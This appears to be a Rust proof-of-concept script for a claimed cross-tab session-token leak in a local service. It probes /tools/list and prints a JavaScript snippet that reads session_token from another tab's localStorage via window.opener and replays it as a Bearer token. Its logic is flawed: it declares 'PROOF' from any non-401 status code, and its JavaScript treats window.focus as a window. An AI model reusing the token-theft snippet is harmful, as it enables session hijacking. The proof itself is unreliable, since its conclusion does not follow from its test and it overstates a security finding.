// F5.rs — Cross-Tab Label Leakage Proof

use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

const HOST: &str = "127.0.0.1";
const PORT: u16 = 18789;

fn http(req: &str) -> String {
    let mut s = TcpStream::connect((HOST, PORT)).expect("connect");
    s.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
    s.write_all(req.as_bytes()).unwrap();
    let mut buf = String::new();
    let _ = s.read_to_string(&mut buf);
    buf
}

fn status(resp: &str) -> u16 {
    resp.lines().next().and_then(|l| l.split_whitespace().nth(1))
        .and_then(|c| c.parse().ok()).unwrap_or(0)
}

fn main() {
    println!("[*] F5: Cross-Tab Label Leakage Proof");
    println!("\n[+] Attack:");
    println!("[+] 1. Two tabs: Tab A (victim), Tab B (attacker)");
    println!("[+] 2. Victim logs in → localStorage.set('session_token', <token>)");
    println!("[+] 3. Attacker reads via window.opener or localStorage");
    println!("[+] 4. Label leakage → impersonation");

    println!("\n[+] Proof Conceptual:");
    println!("[+] 1. discovery.rs uses route-scoped labels in shared storage");
    println!("[+] 2. Labels not isolated per-tab/window");
    println!("[+] 3. window.opener enables cross-tab communication");
    println!("[+] 4. Attacker reads victim's session data");
    println!("[+] 5. Labels used for auth → impersonation possible");

    let resp = http(&format!("GET /tools/list HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nConnection: close\r\n\r\n"));
    let code = status(&resp);
    println!("[+] Probe: /tools/list -> {code}");

    println!("\n[+] Cross-Tab Exploit (JavaScript):");
    println!("[+] const victimTab = window.opener || window.focus;");
    println!("[+] if (victimTab) {");
    println!("[+]   const session = victimTab.localStorage.getItem('session_token');");
    println!("[+]   fetch('/tools/invoke', {headers: {Authorization: 'Bearer ' + session}});");
    println!("[+] }");

    if code != 401 && code != 0 {
        println!("\n[+] PROOF: shared storage enables cross-tab access");
    } else {
        println!("\n[!] NO PROOF: auth rejected");
    }
}
